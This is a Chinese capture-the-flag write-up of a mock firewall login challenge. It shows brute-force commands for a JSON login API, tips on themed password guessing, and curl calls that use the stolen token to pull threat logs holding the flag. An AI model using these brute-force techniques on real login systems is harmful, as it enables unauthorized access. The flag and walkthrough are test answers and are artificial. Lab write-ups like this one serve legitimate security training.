# WP · qsnctf 40861「防火墙管理平台：登录爆破 + 接口鉴权」

> 平台：qsnctf ｜ 题型：登录爆破（JSON 接口）+ token 鉴权 + 业务数据取 flag
> 入口：http://challenge.qsnctf.com:40861/
> flag：`flag{cc840204e89f4a35a034f5d075e78cd9}`

---

## 0. 一句话思路

"XXX 下一代防火墙"登录页（用户名预填 admin）→ 审计 JS 发现 JSON 登录接口 + 威胁日志接口 → 爆破出 `admin123456` 拿 token → 带 token 拉威胁日志 → flag 藏在某条 WebShell 攻击事件的 payload 里。

---

## 1. 信息收集

- 页面是 SPA：`XXX 下一代防火墙 - 管理平台`，登录表单用户名**预填 admin**，旁边有个版本号 **VER 5.8.2**。
- 后端是 Python JSON API（无 Werkzeug 头，但 JS 全用 fetch + JSON）。
- 完整读一遍页面 JS（45KB 全量落盘）得到两个关键接口：

```js
// 登录：JSON 提交，成功返回 token
fetch('/api/login', { method:'POST', headers:{'Content-Type':'application/json'},
                      body: JSON.stringify({username, password}) })
// 威胁日志：需要 Bearer token
fetch(`/api/threats?time=${Date.now()}`, { headers:{ Authorization:`Bearer ${sessionToken}` } })
```

成功响应：`{"message":"身份验证成功","token":"..."}`；失败：401 `{"message":"账号或密码错误..."}`。

## 2. 爆破密码（两轮）

**第一轮：常规字典（login_brute.py + top1000 弱口令）→ 全灭**

```bash
python login_brute.py http://challenge.qsnctf.com:40861/api/login \
    --users wordlists/admin_only.txt --json --ok token --max 0
```
999 条全 401。**注意：`admin123456` 不在 top1000 弱口令字典里**——字典有盲区。

**第二轮：主题口令 → 命中**

按页面线索（品牌 XXX / 设备 NGFW / 版本 5.8.2 / 序列号 NGX26A0719 / 常见组合）生成 45 个候选：
`admin123456`、`ngfw123`、`firewall@123`、`xxx123`、`582`、`demo123`……

```json
// POST /api/login  {"username":"admin","password":"admin123456"}
{"message":"身份验证成功","token":"50e11e3b068afa580fc3f568556bb6a244c73253a3c08fbb"}
```

**经验**：`admin + 常见数字串`（admin123456/admin123/admin888）这类"前缀+数字"口令，中文弱口令 top1000 经常覆盖不全，要单独补一轮。

## 3. 带 token 取数据

```bash
curl -H "Authorization: Bearer <token>" http://challenge.qsnctf.com:40861/api/threats
```

返回 4 条威胁事件，flag 不在列表字段里，**逐条拉详情**：

```bash
curl -H "Authorization: Bearer <token>" http://challenge.qsnctf.com:40861/api/threats/EVT-20260721-1842
```

在 **WebShell 命令执行** 事件的原始攻击载荷里：

```json
"payload": "POST /maintenance/diag HTTP/1.1\n...\ncmd=echo%20flag%7Bcc840204e89f4a35a034f5d075e78cd9%7D"
```

URL 解码 `%7B %7D` = `{ }` → `cmd=echo flag{cc840204e89f4a35a034f5d075e78cd9}`

**剧情**：攻击者试图通过防火墙诊断接口执行 `echo flag{...}`，被 IPS 拦截并留存——flag 就在"被拦截的攻击载荷"里。

## 4. 关键判断技巧

| 点 | 说明 |
|---|---|
| 爆破判据 | JSON 接口用 `--ok token`（响应含 token=成功），比 3xx 更通用 |
| 工具 | `login_brute.py --json --ok token` 适配 JSON 登录接口 |
| 字典盲区 | top1000 弱口令≠全量；补"用户名+数字串"、版本号、品牌词 |
| 页面线索 | 版本号/序列号/品牌占位符都可能指向口令 |
| flag 位置 | 登录后的业务数据里（威胁日志 payload），要逐条拉详情接口 |
| URL 编码 | `%7B`=`{` `%7D`=`}` `%20`=空格，payload 里常见 |

> 关联工具：`ctf-project\ctf_tools\web_tools\login_brute.py`（登录爆破器，支持 JSON 模式 + --gen 组合生成）；字典在 `ctf-project\ctf_tools\wordlists\`。
